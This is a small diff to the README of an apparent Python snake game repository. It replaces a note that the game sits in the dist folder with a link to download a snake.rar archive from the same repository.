@@ -1,3 +1,3 @@
 # snake-python
-Game in dist folder
-Jogo na pasta dist
+Download the Game
+https://github.com/xation222/snake-python/raw/main/snake.rar
